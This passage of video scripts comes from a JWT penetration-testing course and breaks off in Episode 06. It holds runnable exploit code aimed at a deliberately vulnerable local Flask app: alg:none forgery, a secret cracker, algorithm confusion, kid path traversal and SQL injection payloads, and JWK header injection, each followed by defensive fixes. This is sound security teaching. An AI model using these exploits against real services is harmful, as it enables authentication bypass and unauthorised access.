# JWT Security Testing (Pentest) - Video Scripts

## Series Overview

| Episode | Title | Level | Duration | Key Demo |
|---------|-------|-------|----------|----------|
| E01 | JWT Reconnaissance & Token Analysis | L1 | 8 min | Automated JWT analyzer against vulnerable app |
| E02 | The alg:none Exploit | L1 | 8 min | Forge admin token with no signature |
| E03 | Brute-Forcing JWT Secrets | L1 | 9 min | Offline HMAC cracking with wordlist |
| E04 | Exploiting Claims Validation Gaps | L1 | 8 min | Bypass exp, aud, iss checks |
| E05 | Algorithm Confusion Attack | L2 | 14 min | RS256-to-HS256 public key exploit |
| E06 | kid Injection & JWK/JKU Attacks | L2 | 12 min | Path traversal + SQL injection via kid |
| E07 | Token Theft, Replay & Chaining | L2 | 10 min | URL leakage + multi-vuln chain |
| E08 | Building a JWT Testing Framework | L3 | 12 min | Modular automated pentest toolkit |
| E09 | CI/CD Integration & Semgrep Rules | L3 | 9 min | Automated JWT security in pipelines |
| E10 | Professional Reporting & Blue Team | L3 | 10 min | Pentest findings + detection rules |

**Total Runtime:** ~100 minutes
**Format:** Screen recording with code editor + terminal + vulnerable Flask app
**Tools Shown:** Python 3.11+, PyJWT, cryptography, requests, vulnerable-jwt-app.py
**Authorization Context:** All demonstrations use the provided vulnerable-jwt-app.py — a deliberately vulnerable Flask application for authorized security testing practice.

---

## Episode 01: JWT Reconnaissance & Token Analysis

**Duration:** 8 minutes
**Level:** L1 - Reconnaissance
**Learning Objective:** Systematically analyze JWT tokens to identify algorithm choices, claim weaknesses, and potential attack surfaces.

---

### SCENE 1: Hook — The Attacker's Perspective (0:00 - 1:00)

**[VISUAL: Dark terminal. A JWT token scrolling across the screen. Red crosshair overlay on the three dot-separated sections.]**

**NARRATOR:**
"Every JWT tells you how to attack it. The algorithm, the claims, the expiration — they're all visible to anyone who can decode Base64. You don't need the secret. You don't need access to the server code. The token itself reveals the attack surface."

**[VISUAL: Split screen — left shows a JWT decoded on jwt.io, right shows a terminal with exploit scripts ready to run.]**

"In this series, you'll learn to read JWTs like a penetration tester. Decode. Analyze. Exploit. We're testing against a deliberately vulnerable Flask application — no real systems harmed. Let's start with reconnaissance."

---

### SCENE 2: Setting Up the Target (1:00 - 2:30)

**[VISUAL: Terminal showing the vulnerable app startup.]**

**NARRATOR:**
"First, start the target application."

```bash
cd docs/security/training/apps
pip install -r requirements.txt
python vulnerable-jwt-app.py
```

**[VISUAL: Terminal output showing Flask starting on port 5000 with endpoint list.]**

"This Flask app has ten planted JWT vulnerabilities. Each endpoint is deliberately insecure in a specific way. Your job over this series is to find and exploit every one."

**[VISUAL: Code editor showing the login request.]**

```python
import requests
import json

# Authenticate and get a JWT
response = requests.post('http://127.0.0.1:5000/login', json={
    'username': 'alice',
    'password': 'password123'
})

token = response.json()['token']
print("Token received:")
print(token)
```

**[VISUAL: Run the script. Show the token output.]**

"We have a token. Now let's see what it tells us."

---

### SCENE 3: Manual Token Decoding (2:30 - 4:30)

**[VISUAL: Code editor — `jwt_analyzer.py`]**

**NARRATOR:**
"A JWT is three Base64URL-encoded parts separated by dots. You don't need the secret to read the header and payload."

```python
import base64
import json
from datetime import datetime, timezone

def base64url_decode(data):
    """Decode Base64URL with padding fix."""
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def analyze_jwt(token):
    """Decode and analyze a JWT without verification."""
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Not a valid JWT format")
        return

    # Decode header
    header = json.loads(base64url_decode(parts[0]))
    print("=== HEADER ===")
    print(json.dumps(header, indent=2))

    # Decode payload
    payload = json.loads(base64url_decode(parts[1]))
    print("\n=== PAYLOAD ===")
    print(json.dumps(payload, indent=2))

    # Analyze algorithm
    alg = header.get('alg', 'MISSING')
    print(f"\n=== ANALYSIS ===")
    print(f"Algorithm: {alg}")

    if alg == 'HS256':
        print("  [!] HMAC — brute-forceable if secret is weak")
    elif alg == 'none':
        print("  [!!] No signature — token can be forged freely")
    elif alg in ('RS256', 'RS384', 'RS512'):
        print("  [*] RSA — check for algorithm confusion vulnerability")

    # Check for dangerous headers
    for dangerous in ['jwk', 'jku', 'x5u']:
        if dangerous in header:
            print(f"  [!!] {dangerous} header present — possible key injection")

    kid = header.get('kid')
    if kid:
        print(f"  [!] kid present: '{kid}' — check for injection")

    # Analyze claims
    exp = payload.get('exp')
    if exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
        now = datetime.now(timezone.utc)
        if exp_dt < now:
            print(f"  [*] Token EXPIRED: {exp_dt.isoformat()}")
        else:
            delta = exp_dt - now
            print(f"  [*] Expires in: {delta}")
    else:
        print("  [!!] No 'exp' claim — token never expires!")

    if 'aud' not in payload:
        print("  [!] No 'aud' claim — audience not restricted")
    if 'iss' not in payload:
        print("  [!] No 'iss' claim — issuer not verified")
    if 'jti' not in payload:
        print("  [!] No 'jti' claim — no replay protection")

    # Check for privilege claims
    role = payload.get('role', payload.get('roles', payload.get('admin')))
    if role:
        print(f"  [*] Role/privilege claim found: {role}")

    return header, payload

# Run against our captured token
analyze_jwt(token)
```

**[VISUAL: Run the analyzer. Show output highlighting each finding.]**

**NARRATOR:**
"The analyzer immediately tells us: HS256 algorithm — brute-forceable. No audience claim. No JTI for replay protection. And there's a role claim we might want to escalate."

---

### SCENE 4: Automated Endpoint Discovery (4:30 - 6:30)

**[VISUAL: Code editor — endpoint scanner.]**

**NARRATOR:**
"Now let's probe the application's endpoints to map the attack surface."

```python
# Endpoint discovery — probe common JWT-protected paths
endpoints = [
    '/api/profile', '/api/admin', '/api/data',
    '/api/rs256/data', '/api/kid/data', '/api/kid-db/data',
    '/api/jwk/data', '/api/token-in-url',
    '/api/change-password'
]

print("=== ENDPOINT SCAN ===")
for endpoint in endpoints:
    # Test without token
    r_noauth = requests.get(f'http://127.0.0.1:5000{endpoint}')

    # Test with valid token
    r_auth = requests.get(f'http://127.0.0.1:5000{endpoint}',
                         headers={'Authorization': f'Bearer {token}'})

    print(f"\n{endpoint}")
    print(f"  No auth: {r_noauth.status_code} — {r_noauth.text[:60]}")
    print(f"  With auth: {r_auth.status_code} — {r_auth.text[:60]}")
```

**[VISUAL: Terminal showing scan results — some endpoints return 401 without token, 200 with token, some mention different algorithms.]**

**NARRATOR:**
"We've mapped ten endpoints. Several accept our HS256 token. One mentions RS256. Two mention 'kid'. One accepts tokens in the URL query string. Each of these is an attack vector we'll exploit in later episodes."

---

### SCENE 5: Reconnaissance Summary (6:30 - 8:00)

**[VISUAL: Summary card showing findings.]**

**NARRATOR:**
"From a single login and five minutes of analysis, we know:

One — the algorithm is HS256, which can be brute-forced offline.
Two — claims validation is incomplete. No audience, no JTI.
Three — ten protected endpoints with at least four different JWT verification strategies.
Four — the role claim is a string we can try to escalate.

That's a penetration tester's reconnaissance phase. We haven't modified anything, haven't triggered any alerts, haven't done anything that changes server state. We've just read what the application freely tells us."

"Next episode: we forge a token using the alg:none attack."

**[VISUAL: Preview of Episode 02 — a forged token with `"alg": "none"` highlighted.]**

---

## Episode 02: The alg:none Exploit

**Duration:** 8 minutes
**Level:** L1 - Basic Exploitation
**Learning Objective:** Exploit servers that accept unsigned JWT tokens by setting the algorithm to "none".

---

### SCENE 1: Why alg:none Exists (0:00 - 1:30)

**[VISUAL: JWT specification excerpt highlighting the "none" algorithm.]**

**NARRATOR:**
"The JWT specification includes an algorithm called 'none'. It means no signature — the token is unprotected. This was designed for situations where the transport layer already provides integrity, like tokens passed between services inside a TLS tunnel."

"The problem: many JWT libraries accept 'none' by default. If a server doesn't explicitly reject unsigned tokens, an attacker can strip the signature entirely, modify the payload however they want, and the server accepts it."

**[VISUAL: Diagram showing the attack flow.]**

```
Normal flow:
  Client → [header.payload.SIGNATURE] → Server verifies ✓

alg:none attack:
  Attacker → [header.payload.] → Server skips verification ✓
```

"Notice the trailing dot. The token has three parts — header, payload, and an empty signature."

---

### SCENE 2: Crafting the Exploit (1:30 - 4:00)

**[VISUAL: Code editor — `alg_none_attack.py`]**

**NARRATOR:**
"Let's build the exploit. We'll target the `/api/profile` endpoint on our vulnerable app."

```python
import base64
import json
import requests

def base64url_encode(data):
    """Base64URL encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def craft_alg_none_token(payload_claims):
    """Create a JWT with alg:none — no signature needed."""
    # Header: algorithm is "none"
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header).encode())

    # Payload: whatever claims we want
    payload_b64 = base64url_encode(json.dumps(payload_claims).encode())

    # Signature: empty string (trailing dot)
    return f"{header_b64}.{payload_b64}."

# Forge an admin token
forged_token = craft_alg_none_token({
    "sub": "alice",
    "role": "admin",    # Escalated from "user"!
    "iat": 1700000000
})

print(f"Forged token: {forged_token}")
print(f"Note the trailing dot — empty signature\n")

# Attack the vulnerable endpoint
response = requests.get(
    'http://127.0.0.1:5000/api/profile',
    headers={'Authorization': f'Bearer {forged_token}'}
)

print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
```

**[VISUAL: Run the script. Show the response with admin-level access.]**

**NARRATOR:**
"Status 200. We're in. The server accepted a token with no signature and granted us admin access. We didn't need the secret. We didn't need to crack anything. We just told the server not to check."

---

### SCENE 3: Case Variation Bypass (4:00 - 6:00)

**[VISUAL: Code editor showing case variations.]**

**NARRATOR:**
"Some servers check for `alg: none` but only the exact lowercase string. Try case variations."

```python
# Case variations that may bypass naive checks
case_variations = [
    "none", "None", "NONE", "nOnE",
    "noNe", "NoNe", "nONE", "nonE"
]

print("=== Case Variation Bypass ===")
for alg_value in case_variations:
    header = {"alg": alg_value, "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header).encode())

    payload = {"sub": "alice", "role": "admin"}
    payload_b64 = base64url_encode(json.dumps(payload).encode())

    token = f"{header_b64}.{payload_b64}."

    r = requests.get(
        'http://127.0.0.1:5000/api/profile',
        headers={'Authorization': f'Bearer {token}'}
    )

    status = "SUCCESS" if r.status_code == 200 else "BLOCKED"
    print(f"  alg='{alg_value}': {r.status_code} [{status}]")
```

**[VISUAL: Terminal showing which variations succeed.]**

**NARRATOR:**
"Multiple case variations succeed. The fix must be case-insensitive comparison, or better — an explicit allowlist of accepted algorithms that never includes any form of 'none'."

---

### SCENE 4: The Defense & Recap (6:00 - 8:00)

**[VISUAL: Code showing the secure pattern.]**

**NARRATOR:**
"The fix is simple. Always specify the algorithms parameter explicitly."

```python
import jwt

# VULNERABLE — accepts alg:none
payload = jwt.decode(token, "secret", algorithms=None)  # BAD

# SECURE — only accepts HS256
payload = jwt.decode(token, "secret", algorithms=["HS256"])  # GOOD
```

"With an explicit algorithm list, the library rejects any token that uses an algorithm not on the list. No 'none', no case variations, no surprises."

**[VISUAL: Summary card.]**

"The alg:none attack: change the header to `none`, empty the signature, modify the payload freely. It works because servers trust the token to declare how it should be verified. The fix: never trust the token's algorithm claim."

"Next episode: what if the server does check the signature, but uses a weak secret?"

---

## Episode 03: Brute-Forcing JWT Secrets

**Duration:** 9 minutes
**Level:** L1 - Basic Exploitation
**Learning Objective:** Perform offline brute-force attacks against weak HMAC secrets using Python wordlists and optimized cracking scripts.

---

### SCENE 1: Why Offline Cracking Works (0:00 - 1:30)

**[VISUAL: Diagram comparing online vs offline attacks.]**

**NARRATOR:**
"HMAC-signed JWTs have a property that makes them uniquely dangerous: you can verify your guess offline. You have the header, the payload, and the signature. If you know the algorithm is HS256, you just need the secret."

"No network requests. No rate limiting. No account lockout. You take the token home, run it against a wordlist, and wait."

```
Offline cracking:
  input  = header + "." + payload  (from the token)
  guess  = "password123"
  result = HMAC-SHA256(input, guess)
  match  = result == signature?
```

"If the signature matches, you've found the secret. Now you can forge any token you want."

---

### SCENE 2: Building a JWT Cracker (1:30 - 5:00)

**[VISUAL: Code editor — `jwt_cracker.py`]**

**NARRATOR:**
"Let's build a focused JWT brute-force tool."

```python
import hmac
import hashlib
import base64
import time
import sys

def base64url_decode(data):
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def crack_jwt_hs256(token, wordlist_path):
    """Offline brute-force attack against HS256 JWT."""
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Invalid JWT format")
        return None

    # The signing input is header.payload (as raw string)
    signing_input = f"{parts[0]}.{parts[1]}".encode()

    # The expected signature (decoded from Base64URL)
    expected_sig = base64url_decode(parts[2])

    print(f"[*] Signing input length: {len(signing_input)} bytes")
    print(f"[*] Expected signature: {expected_sig.hex()[:32]}...")
    print(f"[*] Loading wordlist: {wordlist_path}")

    attempts = 0
    start_time = time.time()

    with open(wordlist_path, 'r', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue

            attempts += 1

            # Compute HMAC-SHA256
            computed = hmac.new(
                secret.encode(),
                signing_input,
                hashlib.sha256
            ).digest()

            if hmac.compare_digest(computed, expected_sig):
                elapsed = time.time() - start_time
                rate = attempts / elapsed if elapsed > 0 else 0
                print(f"\n[+] SECRET FOUND: '{secret}'")
                print(f"[+] Attempts: {attempts:,}")
                print(f"[+] Time: {elapsed:.2f}s")
                print(f"[+] Rate: {rate:,.0f} attempts/sec")
                return secret

            if attempts % 100000 == 0:
                elapsed = time.time() - start_time
                rate = attempts / elapsed if elapsed > 0 else 0
                print(f"  [{attempts:,} attempts, {rate:,.0f}/sec]",
                      end='\r')

    elapsed = time.time() - start_time
    print(f"\n[-] Secret not found after {attempts:,} attempts "
          f"({elapsed:.2f}s)")
    return None
```

**[VISUAL: Run the cracker against the captured token with a common passwords wordlist.]**

```python
# Capture a token from our vulnerable app
import requests

r = requests.post('http://127.0.0.1:5000/login',
                  json={'username': 'alice', 'password': 'password123'})
token = r.json()['token']

# Crack it
secret = crack_jwt_hs256(token, 'common-passwords.txt')
```

**[VISUAL: Terminal showing progress... then "SECRET FOUND: 'password123'" in green.]**

**NARRATOR:**
"Found it. The secret is 'password123'. Took less than a second against a common passwords list. Now we can forge any token we want."

---

### SCENE 3: Forging Tokens with the Cracked Secret (5:00 - 7:00)

**[VISUAL: Code editor — using the cracked secret.]**

**NARRATOR:**
"With the secret in hand, we own the authentication system."

```python
import jwt

# Forge an admin token with the cracked secret
forged = jwt.encode(
    {
        "sub": "alice",
        "role": "admin",
        "iat": 1700000000,
        "exp": 9999999999  # Far future — never expires
    },
    "password123",  # Cracked secret
    algorithm="HS256"
)

print(f"Forged admin token: {forged}")

# Use it
r = requests.get(
    'http://127.0.0.1:5000/api/admin',
    headers={'Authorization': f'Bearer {forged}'}
)
print(f"Admin endpoint: {r.status_code}")
print(f"Response: {r.text}")
```

**[VISUAL: Terminal showing successful admin access.]**

**NARRATOR:**
"Full admin access. We cracked the secret offline, forged a new token with elevated privileges and a far-future expiration, and the server accepted it without question."

---

### SCENE 4: Defense & Recap (7:00 - 9:00)

**[VISUAL: Comparison table of secret strengths.]**

| Secret | Crack Time | Verdict |
|--------|-----------|---------|
| `password123` | < 1 second | Catastrophic |
| `MyApp2024!` | Minutes | Weak |
| Random 32 bytes | Heat death of universe | Secure |

**NARRATOR:**
"The defense: use a cryptographically random secret of at least 256 bits."

```python
import secrets

# Generate a secure JWT secret
jwt_secret = secrets.token_hex(32)  # 256-bit random
print(f"Secure secret: {jwt_secret}")
# Example: 'a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1'
```

"Or better: use asymmetric algorithms like RS256 where the signing key never leaves the server. There's no secret to brute-force."

"Next episode: what if the signature is valid but the claims are wrong?"

---

## Episode 04: Exploiting Claims Validation Gaps

**Duration:** 8 minutes
**Level:** L1 - Basic Exploitation
**Learning Objective:** Exploit missing or incomplete JWT claims validation — expired tokens, cross-audience injection, and missing issuer checks.

---

### SCENE 1: The Claims Problem (0:00 - 1:30)

**[VISUAL: JWT payload with claims highlighted.]**

**NARRATOR:**
"A valid signature only proves the token hasn't been tampered with. It doesn't prove the token should still be accepted. That's what claims validation does — exp, aud, iss, nbf. If the server doesn't check these claims, a signed token becomes a permanent skeleton key."

**[VISUAL: Three attack scenarios listed.]**

```
Attack 1: Expired tokens — use a token from last year
Attack 2: Cross-audience — use App A's token on App B
Attack 3: Missing issuer — forge from a different identity provider
```

---

### SCENE 2: Expired Token Exploit (1:30 - 3:30)

**[VISUAL: Code editor — expired token attack.]**

**NARRATOR:**
"The `/api/admin` endpoint on our vulnerable app doesn't validate the `exp` claim."

```python
import jwt
import requests
from datetime import datetime, timezone

# Create a token that expired a year ago
expired_token = jwt.encode(
    {
        "sub": "alice",
        "role": "admin",
        "exp": int(datetime(2024, 1, 1, tzinfo=timezone.utc).timestamp()),
        "iat": int(datetime(2024, 1, 1, tzinfo=timezone.utc).timestamp())
    },
    "password123",  # Known secret from Episode 03
    algorithm="HS256"
)

print(f"Token expired: 2024-01-01")
print(f"Current date: {datetime.now(timezone.utc).date()}")

# Try it against the admin endpoint
r = requests.get(
    'http://127.0.0.1:5000/api/admin',
    headers={'Authorization': f'Bearer {expired_token}'}
)

print(f"\nAdmin endpoint: {r.status_code}")
print(f"Response: {r.text}")
```

**[VISUAL: Terminal showing 200 OK — expired token accepted.]**

**NARRATOR:**
"A token from over a year ago — accepted. This means every token ever issued by this application is still valid. Every former employee, every revoked session, every compromised credential — their tokens still work."

---

### SCENE 3: Cross-Audience Attack (3:30 - 5:30)

**[VISUAL: Code editor — audience bypass.]**

**NARRATOR:**
"The `/api/data` endpoint doesn't check the `aud` claim. We can use a token intended for a completely different service."

```python
# Token with wrong audience
wrong_audience_token = jwt.encode(
    {
        "sub": "alice",
        "role": "admin",
        "aud": "completely-different-service.example.com",
        "exp": 9999999999
    },
    "password123",
    algorithm="HS256"
)

print("Token audience: completely-different-service.example.com")
print("Target service: vulnerable-jwt-app (localhost:5000)")

r = requests.get(
    'http://127.0.0.1:5000/api/data',
    headers={'Authorization': f'Bearer {wrong_audience_token}'}
)

print(f"\nData endpoint: {r.status_code}")
print(f"Response: {r.text}")
```

**[VISUAL: Terminal showing 200 OK — wrong audience accepted.]**

**NARRATOR:**
"The token was intended for a completely different service, but our app accepted it. In a microservices architecture, this means a token from the public API could be used against the admin API. No audience isolation at all."

---

### SCENE 4: Combined Claims Attack (5:30 - 7:00)

**[VISUAL: Code editor — all claims missing.]**

**NARRATOR:**
"Let's craft the worst case: a token with no exp, no aud, no iss, and escalated privileges."

```python
# The ultimate skeleton key
skeleton_key = jwt.encode(
    {
        "sub": "alice",
        "role": "admin"
        # No exp — never expires
        # No aud — works everywhere
        # No iss — from anywhere
        # No jti — replay forever
    },
    "password123",
    algorithm="HS256"
)

print("=== Skeleton Key Token ===")
print("  Expires: NEVER")
print("  Audience: ANY")
print("  Issuer: ANY")
print("  Replay protection: NONE")
print("  Role: admin")

# Test against all endpoints
for endpoint in ['/api/profile', '/api/admin', '/api/data']:
    r = requests.get(
        f'http://127.0.0.1:5000{endpoint}',
        headers={'Authorization': f'Bearer {skeleton_key}'}
    )
    print(f"\n  {endpoint}: {r.status_code}")
```

**[VISUAL: Terminal showing all three endpoints returning 200.]**

**NARRATOR:**
"One token. No expiration. No audience restriction. No issuer check. Works on every endpoint. This is what missing claims validation looks like in practice."

---

### SCENE 5: Defense & Recap (7:00 - 8:00)

**[VISUAL: The secure verification pattern.]**

```python
# SECURE: Validate ALL claims
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"],
    audience="api.myapp.com",          # Require correct audience
    issuer="auth.myapp.com",           # Require correct issuer
    options={
        "require": ["exp", "aud", "iss", "sub", "jti"],
        "verify_exp": True,
        "verify_aud": True,
        "verify_iss": True
    }
)
```

**NARRATOR:**
"The fix: require every claim. Verify every claim. The `options` parameter with `require` ensures that tokens missing any of these claims are rejected automatically."

"We've now covered L1 exploitation: alg:none, secret cracking, and claims bypass. Next episode moves to L2 — algorithm confusion, where we turn RSA public keys into HMAC secrets."

---

## Episode 05: Algorithm Confusion Attack

**Duration:** 14 minutes
**Level:** L2 - Advanced Exploitation
**Learning Objective:** Exploit the RS256-to-HS256 algorithm confusion vulnerability to forge tokens using a publicly available RSA public key as the HMAC secret.

---

### SCENE 1: The Fundamental Flaw (0:00 - 2:30)

**[VISUAL: Diagram showing RS256 vs HS256 key usage.]**

**NARRATOR:**
"RS256 uses a key pair. The private key signs. The public key verifies. The public key is — by design — public. Anyone can have it."

"HS256 uses a single shared secret. The same key signs and verifies. That key must be kept secret."

**[VISUAL: Animation showing the collision.]**

"Here's the vulnerability. The server is configured for RS256 and uses the public key for verification. An attacker sends a token with `alg: HS256`. A vulnerable library says: okay, HS256. I need a secret to verify. The server hands it the verification key — which is the RSA public key."

"The attacker already has the public key. They sign their forged token with it using HS256. The server verifies using the same public key as the HMAC secret. The signature matches."

```
Server expects: RS256
  → Verify with PUBLIC_KEY using RSA

Attacker sends: HS256
  → Server verifies with PUBLIC_KEY using HMAC
  → Attacker signed with PUBLIC_KEY using HMAC
  → Signature matches ✓
```

"The public key — meant to verify RSA signatures — becomes the HMAC secret. And the attacker has it."

---

### SCENE 2: Getting the Public Key (2:30 - 4:30)

**[VISUAL: Code editor — obtaining the public key.]**

**NARRATOR:**
"First, we need the target's RSA public key. In practice, public keys are available from JWKS endpoints, TLS certificates, API documentation, or just the server's metadata."

```python
import requests

# Our vulnerable app exposes a public key endpoint
r = requests.get('http://127.0.0.1:5000/api/rs256/public-key')
public_key_pem = r.text

print("=== Target's RSA Public Key ===")
print(public_key_pem)
print("This key is PUBLIC — available to anyone.")
print("We're about to use it as an HMAC secret.")
```

**[VISUAL: Terminal showing the full PEM public key.]**

**NARRATOR:**
"There it is. A standard RSA public key in PEM format. The server uses this to verify RS256 tokens. We're about to use it to sign HS256 tokens."

---

### SCENE 3: Building the Exploit (4:30 - 9:00)

**[VISUAL: Code editor — `algorithm_confusion.py`]**

**NARRATOR:**
"The exploit has three steps: get the public key, craft a token with HS256, and sign it using the public key bytes as the HMAC secret."

```python
import jwt
import requests
import json

# Step 1: Get the target's public key
print("[*] Step 1: Fetching target's RSA public key...")
r = requests.get('http://127.0.0.1:5000/api/rs256/public-key')
public_key_pem = r.text
print(f"[+] Public key obtained ({len(public_key_pem)} bytes)")

# Step 2: Craft our forged payload
print("[*] Step 2: Crafting forged payload...")
forged_payload = {
    "sub": "attacker",
    "role": "admin",
    "iat": 1700000000,
    "exp": 9999999999
}
print(f"[+] Payload: {json.dumps(forged_payload)}")

# Step 3: Sign with HS256 using the public key as the HMAC secret
print("[*] Step 3: Signing with HS256 using public key as secret...")

# The public key PEM bytes become the HMAC secret
forged_token = jwt.encode(
    forged_payload,
    public_key_pem,          # RSA public key used as HMAC secret!
    algorithm="HS256"
)

print(f"[+] Forged token: {forged_token[:50]}...")

# Step 4: Send to the RS256 endpoint
print("[*] Step 4: Sending to RS256-protected endpoint...")
r = requests.get(
    'http://127.0.0.1:5000/api/rs256/data',
    headers={'Authorization': f'Bearer {forged_token}'}
)

print(f"\n[*] Response: {r.status_code}")
print(f"[*] Body: {r.text}")

if r.status_code == 200:
    print("\n[+] ALGORITHM CONFUSION SUCCESS!")
    print("[+] Forged HS256 token accepted by RS256 endpoint")
    print("[+] The public key was used as the HMAC secret")
```

**[VISUAL: Run the exploit. Terminal showing successful authentication.]**

**NARRATOR:**
"Algorithm confusion successful. We signed an HS256 token using the public key — which anyone can obtain — and the RS256 endpoint accepted it. The server's verification function used the public key as the HMAC secret, and our signature matched because we used the same key to sign."

---

### SCENE 4: Why PyJWT Blocks This (9:00 - 11:00)

**[VISUAL: Code showing PyJWT's built-in protection.]**

**NARRATOR:**
"Modern versions of PyJWT actually prevent this. If you pass an RSA public key to `jwt.decode` with `algorithms=['HS256']`, it raises an error. The library detects the key type mismatch."

```python
# PyJWT >= 2.4 prevents this:
try:
    payload = jwt.decode(token, public_key_pem, algorithms=["HS256"])
except jwt.exceptions.InvalidKeyError as e:
    print(f"Blocked: {e}")
    # "The specified key is an asymmetric key... not valid for HS256"
```

"But our vulnerable app bypasses this protection by using the raw HMAC verification function directly. And in production, many applications use older libraries, custom verification code, or languages where this protection doesn't exist."

**[VISUAL: Show the vulnerable code path.]**

"The lesson for pentesters: always test algorithm confusion. Even if PyJWT blocks it, the application might use a different code path, an older library, or a different language entirely."

---

### SCENE 5: Defense & Recap (11:00 - 14:00)

**[VISUAL: The secure pattern.]**

```python
# SECURE: Algorithm from configuration, NEVER from the token
ALGORITHM = "RS256"  # Hardcoded, not from token header

def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=[ALGORITHM]  # Only RS256 accepted
    )
```

**NARRATOR:**
"The fix has two parts. One: specify a single algorithm in the `algorithms` parameter. Never mix symmetric and asymmetric algorithms. Two: use different key objects for different algorithm types — the library can then reject type mismatches."

"Algorithm confusion exploits the gap between what the server expects and what the token declares. The fix: never let the token choose its own algorithm."

"Next episode: kid header injection — path traversal and SQL injection through the Key ID field."

---

## Episode 06: kid Injection & JWK/JKU Attacks

**Duration:** 12 minutes
**Level:** L2 - Advanced Exploitation
**Learning Objective:** Exploit the JWT `kid` header parameter through path traversal and SQL injection, and abuse `jwk`/`jku` headers to inject attacker-controlled verification keys.

---

### SCENE 1: What kid Does (0:00 - 1:30)

**[VISUAL: JWT header with kid field highlighted.]**

**NARRATOR:**
"The `kid` — Key ID — header tells the server which key to use for verification. When a server rotates keys or supports multiple signing keys, `kid` identifies the correct one."

"The problem: `kid` comes from the token. It's attacker-controlled input. If the server uses it in a file path, database query, or any other operation without sanitization — we get injection."

---

### SCENE 2: kid Path Traversal (1:30 - 4:30)

**[VISUAL: Code editor — path traversal exploit.]**

**NARRATOR:**
"Our vulnerable app's `/api/kid/data` endpoint uses the kid value in a file path."

```python
import jwt
import requests

# kid path traversal — point to /dev/null (empty file)
print("[*] kid Path Traversal Attack")
print("[*] Target: /api/kid/data")
print("[*] Strategy: kid = '../../../dev/null' → empty key → sign with ''")

# /dev/null is an empty file — empty string as HMAC secret
forged_token = jwt.encode(
    {
        "sub": "attacker",
        "role": "admin",
        "exp": 9999999999
    },
    "",           # Empty secret — matches empty /dev/null contents
    algorithm="HS256",
    headers={"kid": "../../../dev/null"}  # Path traversal!
)

print(f"[+] Token kid header: ../../../dev/null")
print(f"[+] Signed with: empty string")

r = requests.get(
    'http://127.0.0.1:5000/api/kid/data',
    headers={'Authorization': f'Bearer {forged_token}'}
)

print(f"\n[*] Response: {r.status_code}")
print(f"[*] Body: {r.text}")
```

**[VISUAL: Terminal showing successful authentication.]**

**NARRATOR:**
"The server reads `/dev/null` — an empty file — as the key. We signed with an empty string. Empty matches empty. Full admin access through a traversal in the kid header."

---

### SCENE 3: kid SQL Injection (4:30 - 8:00)

**[VISUAL: Code editor — SQL injection exploit.]**

**NARRATOR:**
"The `/api/kid-db/data` endpoint stores keys in a database and looks them up using the kid value in a SQL query."

```python
print("[*] kid SQL Injection Attack")
print("[*] Target: /api/kid-db/data")
print("[*] Strategy: UNION SELECT to return our chosen secret")

# The server runs: SELECT key FROM keys WHERE kid = '{kid}'
# Our injection: ' UNION SELECT 'attacker-secret' --
# Full query becomes:
#   SELECT key FROM keys WHERE kid = '' UNION SELECT 'attacker-secret' --'
# Returns: 'attacker-secret'

chosen_secret = "attacker-controlled-secret"

forged_token = jwt.encode(
    {
        "sub": "attacker",
        "role": "admin",
        "exp": 9999999999
    },
    chosen_secret,
    algorithm="HS256",
    headers={"kid": f"' UNION SELECT '{chosen_secret}' --"}
)

print(f"[+] SQL injection payload: ' UNION SELECT '{chosen_secret}' --")
print(f"[+] Signed with: {chosen_secret}")

r = requests.get(
    'http://127.0.0.1:5000/api/kid-db/data',
    headers={'Authorization': f'Bearer {forged_token}'}
)

print(f"\n[*] Response: {r.status_code}")
print(f"[*] Body: {r.text}")
```

**[VISUAL: Terminal showing successful admin access.]**

**NARRATOR:**
"The UNION SELECT returns our chosen secret. We signed the token with that same secret. The signature matches. We control both the key and the token — complete bypass."

"This is a two-for-one: SQL injection and authentication bypass from a single injection point."

---

### SCENE 4: JWK and JKU Header Injection (8:00 - 10:30)

**[VISUAL: JWT headers with jwk and jku fields.]**

**NARRATOR:**
"Two more dangerous headers: `jwk` embeds a public key directly in the token. `jku` provides a URL to fetch keys from."

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json

print("[*] JWK Header Injection Attack")
print("[*] Target: /api/jwk/data")
print("[*] Strategy: Embed our own public key in the token header")

# Generate our own RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Export public key as JWK
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat
)
public_numbers = public_key.public_numbers()

# Build the JWK
def int_to_base64url(n):
    """Convert integer to Base64URL-encoded bytes."""
    import math
    byte_length = max(1, math.ceil(n.bit_length() / 8))
    return base64.urlsafe_b64encode(
        n.to_bytes(byte_length, 'big')
    ).rstrip(b'=').decode()

jwk = {
    "kty": "RSA",
    "n": int_to_base64url(public_numbers.n),
    "e": int_to_base64url(public_numbers.e),
    "alg": "RS256",
    "use": "sig"
}

# Sign the token with OUR private key
private_pem = private_key.private_bytes(
    Encoding.PEM,
    serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption()
)

forged_token = jwt.encode(
    {"sub": "attacker", "role": "admin", "exp": 9999999999},
    private_pem,
    algorithm="RS256",
    headers={"jwk": jwk}  # Our public key embedded in the header!
)

print(f"[+] Token includes attacker's public key in 'jwk' header")
print(f"[+] Signed with attacker's private key")

r = requests.get(
    'http://127.0.0.1:5000/api/jwk/data',
    headers={'Authorization': f'Bearer {forged_token}'}
)

